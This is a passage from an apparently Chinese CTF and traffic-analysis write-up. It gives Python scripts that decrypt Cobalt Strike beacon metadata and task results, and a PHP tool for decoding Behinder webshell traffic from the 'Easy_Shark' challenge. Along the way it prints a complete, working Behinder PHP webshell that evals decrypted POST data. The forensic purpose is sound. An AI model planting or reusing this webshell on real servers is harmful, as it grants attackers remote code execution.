publicKey = (</span><br><span class="line">            <span class="string">b&quot;-----BEGIN PUBLIC KEY-----\n&quot;</span></span><br><span class="line">            + base64.encodebytes(<span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x &amp; <span class="number">0xFF</span>, publicKey)))</span><br><span class="line">            + <span class="string">b&quot;-----END PUBLIC KEY-----&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    privateKey = privateKey.decode()</span><br><span class="line">    publicKey = publicKey.decode()</span><br><span class="line">    <span class="keyword">return</span> publicKey, privateKey</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_PK_Cipher</span>(<span class="params">privateKey</span>):</span><br><span class="line">    privateKey = RSA.import_key(privateKey.encode())</span><br><span class="line">    n_bytes = privateKey.n.bit_length() // <span class="number">8</span></span><br><span class="line">    cipher = PKCS1_v1_5.new(privateKey)</span><br><span class="line">    <span class="keyword">return</span> cipher, n_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">private_decrypt</span>(<span class="params">cipher_text, privateKey</span>):</span><br><span class="line">    cipher, n_bytes = create_PK_Cipher(privateKey)</span><br><span class="line">    cipher_text = base64.b64decode(cipher_text.encode())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(</span><br><span class="line">        cipher.decrypt(cipher_text[i: i + n_bytes], <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher_text), n_bytes)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_AES_HMAC_Key</span>(<span class="params">SerializeKeyPath, rsa_cipher_text</span>):</span><br><span class="line">    _, privateKey = get_RSA_PriKey(SerializeKeyPath)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (plain_text := private_decrypt(rsa_cipher_text, privateKey)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]: 解密错误, 可能是RSA_Cipher_Text或者密钥有误!&quot;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    raw_aes_keys = plain_text[<span class="number">8</span>:<span class="number">24</span>]</span><br><span class="line">    raw_aes_hash256 = hashlib.sha256(raw_aes_keys)</span><br><span class="line">    digest = raw_aes_hash256.digest()</span><br><span class="line">    aes_key = digest[:<span class="number">16</span>]</span><br><span class="line">    hmac_key = digest[<span class="number">16</span>:]</span><br><span class="line">    <span class="keyword">return</span> aes_key, hmac_key, plain_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    args = parse_arguments()</span><br><span class="line">    SerializeKeyPath = args.f</span><br><span class="line"><span class="comment">#此处放置load导出的cookie</span></span><br><span class="line">    rsa_cipher_text = <span class="string">&quot;xeoOUNy9EhFV01fTyqDHJTvrnfCji6iHiLabfNhxoLKdY6xA8HV8g8fmvrgs6J4d3MjdhG9ww/CAj6tEFj3Y1hfcODoOz+ggqc5jb7lcGuEHmuN7j0NawY8t5Ro7vbnDJmGF9a7Zve3v3cYHEZexDjTgfl+119fyM6hWOuXd5LM=&quot;</span></span><br><span class="line">    aes_key, hmac_key, plain_text = get_AES_HMAC_Key(SerializeKeyPath, rsa_cipher_text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;AES key: <span class="subst">&#123;aes_key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;HMAC key: <span class="subst">&#123;hmac_key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    hexdump.hexdump(plain_text)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python cs.py -f .cobaltstrike.beacon_keys</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AES key:5f277b49bb4b15cc0728835639d691fc</span><br><span class="line">HMAC key:8c67ccf3324dae539604a6e019a57664</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Beacon任务执行结果解密</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> hexdump</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compare_mac</span>(<span class="params">mac, mac_verif</span>):</span><br><span class="line">	<span class="keyword">if</span> mac == mac_verif:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(mac) != <span class="built_in">len</span>(mac_verif):</span><br><span class="line">		<span class="built_in">print</span></span><br><span class="line">		<span class="string">&quot;invalid MAC size&quot;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">	result = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(mac, mac_verif):</span><br><span class="line">		result |= x ^ y</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> result == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encrypted_data, iv_bytes, signature, shared_key, hmac_key</span>):</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> compare_mac(hmac.new(hmac_key, encrypted_data, digestmod=<span class="string">&quot;sha256&quot;</span>).digest()[<span class="number">0</span>:<span class="number">16</span>], signature):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;message authentication failed&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">	cypher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)</span><br><span class="line">	data = cypher.decrypt(encrypted_data)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment">#key源自Beacon_metadata_RSA_Decrypt.py</span></span><br><span class="line">SHARED_KEY = binascii.unhexlify(<span class="string">&quot;5f277b49bb4b15cc0728835639d691fc&quot;</span>)</span><br><span class="line">HMAC_KEY = binascii.unhexlify(<span class="string">&quot;8c67ccf3324dae539604a6e019a57664&quot;</span>)</span><br><span class="line"><span class="comment"># 密文 原始数据 hex 解码 base64加密</span></span><br><span class="line"></span><br><span class="line">encrypt_data=<span class="string">&quot;AAAAUJwE+4Qyg3PGsdV+8stF4umcLlO5zBdLb0WRnKAT9cEjsKqM7DiRiWBGBMpksTmEVk+s+DJY+obKpkiG3j0COF04qLaB8INl6IaF+kqCeauM&quot;</span></span><br><span class="line"></span><br><span class="line">encrypt_data=base64.b64decode(encrypt_data)</span><br><span class="line"></span><br><span class="line">encrypt_data_length=encrypt_data[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">encrypt_data_length=<span class="built_in">int</span>.from_bytes(encrypt_data_length, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">encrypt_data_l = encrypt_data[<span class="number">4</span>:<span class="built_in">len</span>(encrypt_data)]</span><br><span class="line"></span><br><span class="line">data1=encrypt_data_l[<span class="number">0</span>:encrypt_data_length-<span class="number">16</span>]</span><br><span class="line">signature=encrypt_data_l[encrypt_data_length-<span class="number">16</span>:encrypt_data_length]</span><br><span class="line">iv_bytes = <span class="built_in">bytes</span>(<span class="string">&quot;abcdefghijklmnop&quot;</span>,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dec=decrypt(data1,iv_bytes,signature,SHARED_KEY,HMAC_KEY)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">counter = dec[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">counter=<span class="built_in">int</span>.from_bytes(counter, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;counter:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(counter))</span><br><span class="line"></span><br><span class="line">dec_length = dec[<span class="number">4</span>:<span class="number">8</span>]</span><br><span class="line">dec_length=<span class="built_in">int</span>.from_bytes(dec_length, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;任务返回长度:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(dec_length))</span><br><span class="line"></span><br><span class="line">de_data= dec[<span class="number">8</span>:<span class="built_in">len</span>(dec)]</span><br><span class="line">Task_type=de_data[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">Task_type=<span class="built_in">int</span>.from_bytes(Task_type, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;任务输出类型:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(Task_type))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(de_data[<span class="number">4</span>:dec_length].decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))    <span class="comment"># 第69行</span></span><br><span class="line"><span class="built_in">print</span>(hexdump.hexdump(dec))</span><br></pre></td></tr></table></figure>

<h1 id="冰蝎流量"><a href="#冰蝎流量" class="headerlink" title="冰蝎流量"></a>冰蝎流量</h1><p>流量特征</p>
<p>Easy_Shark<br><a href="https://github.com/nyyyddddn/ctf/blob/main/Sictf2023%20%23Round%202/misc/Easy_Shark.zip">https://github.com/nyyyddddn/ctf/blob/main/Sictf2023%20%23Round%202/misc/Easy_Shark.zip</a></p>
<p>追踪http 流 发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">    $key=&quot;2295d22e2d70888f&quot;;</span><br><span class="line">	$_SESSION[&#x27;k&#x27;]=$key;</span><br><span class="line">	$post=file_get_contents(&quot;php://input&quot;);</span><br><span class="line">	if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class="line">	&#123;</span><br><span class="line">		$t=&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class="line">		$post=$t($post.&quot;&quot;);</span><br><span class="line">		</span><br><span class="line">		for($i=0;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">    			 $post[$i] = $post[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		$post=openssl_decrypt($post, &quot;AES128&quot;, $key);</span><br><span class="line">	&#125;</span><br><span class="line">    $arr=explode(&#x27;|&#x27;,$post);</span><br><span class="line">    $func=$arr[0];</span><br><span class="line">    $params=$arr[1];</span><br><span class="line">	class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class="line">    @call_user_func(new C(),$params);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$key=&quot;2295d22e2d70888f&quot;;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="title function_ invoke__">getopt</span>(<span class="string">&#x27;a:k:f:t:d:&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;进入php文件\n\n\n\n\n&quot;</span>;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;k&#x27;</span>])?<span class="variable">$key</span>=<span class="variable">$arr</span>[<span class="string">&#x27;k&#x27;</span>]:<span class="variable">$key</span>=<span class="string">&#x27;e45e329feb5d925b&#x27;</span>;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;t&#x27;</span>])?<span class="variable">$http_type</span>=<span class="variable">$arr</span>[<span class="string">&#x27;t&#x27;</span>]:<span class="variable">$http_type</span>=<span class="string">&#x27;requests&#x27;</span>;</span><br><span class="line"><span class="comment">// echo &quot;this is \$key:&quot;.$key.&quot;\n this is \$http_type:&quot;.$http_type;</span></span><br><span class="line"><span class="comment">// echo &quot;\$post is :&quot;.$post.&quot;\n\n&quot;;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$arr</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="variable">$post_raw</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;d&#x27;</span>] = <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$post_raw</span>= <span class="variable">$arr</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_convert_str</span>(<span class="params"><span class="variable">$post_raw</span>,<span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// preg_match(&#x27;//&#x27;);</span></span><br><span class="line">    <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z0-9\+\=\/]&#123;24,&#125;/i&#x27;</span>,<span class="variable">$post_raw</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="comment">// echo &quot;\$post is :&quot;.$post[0];</span></span><br><span class="line">    <span class="comment">// echo &quot;aes的数据为：&quot;;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$post</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// echo &quot;进入intoaes函数：&quot;.$post[0];</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$post</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>[<span class="number">0</span>], <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="comment">//日志方法，具体自己实现</span></span><br><span class="line">        <span class="comment">// CoreHelper::write(json_encode([&#x27;eventName&#x27;,&#x27;order_id&#x27;=&gt;$order-&gt;order_id??&#x27;&#x27;,$e-&gt;getMessage()], JSON_UNESCAPED_UNICODE)); </span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// var_dump($post);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$post</span> == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$post</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor_convert_str</span>(<span class="params"><span class="variable">$post_raw</span>,<span class="variable">$key</span>,<span class="variable">$http_type</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// echo &quot;进入intoxor函数1,raw_data is :&quot;.$post_raw.&quot;xixixi\n\n\n\n\n\n\n&quot;;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$http_type</span> == <span class="string">&#x27;requests&#x27;</span>)&#123;</span><br><span class="line">        <span class="comment">// echo &quot;this is :&quot;.$http_type.&quot;\n&quot;;</span></span><br><span class="line">		<span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">        <span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post_raw</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="variable">$post_raw</span> = <span class="variable">$post</span>;</span><br><span class="line">        <span class="comment">// echo &quot;this is \033[[95mrequests\033[[1m&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// echo &quot;thisresponse&quot;;</span></span><br><span class="line">        <span class="variable">$post</span> = <span class="variable">$post_raw</span>;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;&lt;b&gt;Warning&lt;/b&gt;:  session_start(): Cannot send session cache limiter - headers already sent in &lt;b&gt;D:\phpstudy_pro\WWW\sqli-labs\shell.php&lt;/b&gt; on line &lt;b&gt;3&lt;/b&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        <span class="comment">// $pattern = &#x27;on line &lt;b&gt;3&lt;/b&gt;&lt;br /&gt;&#x27;;</span></span><br><span class="line">        <span class="comment">// echo &quot;hereis\$post&quot;.$post.&quot;\n\n\n\n&quot;;</span></span><br><span class="line">        <span class="comment">// var_dump(strpos($post,$pattern));</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$post</span>,<span class="variable">$pattern</span>) != <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$post</span>,<span class="title function_ invoke__">strpos</span>(<span class="variable">$post</span>,<span class="variable">$pattern</span>)+<span class="title function_ invoke__">strlen</span>(<span class="variable">$pattern</span>)+<span class="number">1</span>);</span><br><span class="line">            <span class="comment">// echo &quot;thatshouldberesult&quot;.$result.&quot;tty&quot;;</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$result</span> != <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable">$post</span> = <span class="variable">$result</span>;</span><br><span class="line">                <span class="comment">// echo &quot;intotheconvert&quot;;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">                &#125;</span><br><span class="line">    <span class="comment">// echo &quot;进入intoxor函数2&quot;.$post.&quot;xixixi&quot;;</span></span><br><span class="line">    <span class="comment">// echo &quot;this is \$post:&quot;.$post;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$post</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$post</span> = <span class="title function_ invoke__">aes_convert_str</span>(<span class="variable">$post_raw</span>,<span class="variable">$key</span>);</span><br><span class="line"><span class="comment">// echo &quot;aes函数complate&quot;.$post.&quot;\n&quot;;</span></span><br><span class="line"><span class="variable">$post</span> === <span class="string">&#x27;no&#x27;</span>?<span class="variable">$post</span> = <span class="title function_ invoke__">xor_convert_str</span>(<span class="variable">$post_raw</span>,<span class="variable">$key</span>,<span class="variable">$http_type</span>):<span class="variable">$post</span>;</span><br><span class="line"><span class="comment">// echo &quot;this is \$post&quot;.$post;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\&#123;/i&#x27;</span>,<span class="variable">$post</span>))&#123;</span><br><span class="line">    <span class="comment">// echo $post;</span></span><br><span class="line">    <span class="comment">// exit();</span></span><br><span class="line">    <span class="comment">// echo &quot;error is &quot;.$post;</span></span><br><span class="line">    <span class="variable">$raw_data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$result</span> = [];</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$raw_data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">            <span class="variable">$result</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$value</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 捕获异常</span></span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Message: &#x27;</span> .<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr_2</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line"><span class="variable">$func</span> = <span class="variable">$arr_2</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$arr_2</span>[<span class="number">1</span>])?<span class="variable">$parm</span>=<span class="variable">$arr_2</span>[<span class="number">1</span>]:<span class="variable">$parm</span>=<span class="variable">$func</span>;      <span class="comment"># 解决tcp请求包截取不完整导致aes解密后没有</span></span><br><span class="line"><span class="comment">// print(&quot;intotheexplode:&quot;.$parm);</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$parm</span> === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$parm</span>=<span class="string">&#x27;Y29udGVudCBpcyBlbXB0eQ==&#x27;</span>;       <span class="comment"># 解决 http截取的tcp包不完整的情况</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z0-9\+\=\/]&#123;24,&#125;/i&#x27;</span>,<span class="variable">$parm</span>,<span class="variable">$last_result</span>);</span><br><span class="line"><span class="comment">// echo &quot;匹配到的内容为&quot;.$result[0];</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$last_result</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$last_result</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$parm</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php decropt.php -a 后面接要解密的字符串</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php decropt.php -f 解密的字符串的文件</span><br></pre></td></tr></table></figure>

<blockquote>
<p>此处的密文字符串文件只允许存在密文，不允许有http请求体。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php decropt.php -k 秘钥 -a 解密字符串</span><br></pre></td></tr></table></figure>

<blockquote>
<p>默认的key值为冰蝎默认密码。</p>
</blockquote>
<p>tcp 流5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php decropt.php -k 2295d22e2d70888f -a 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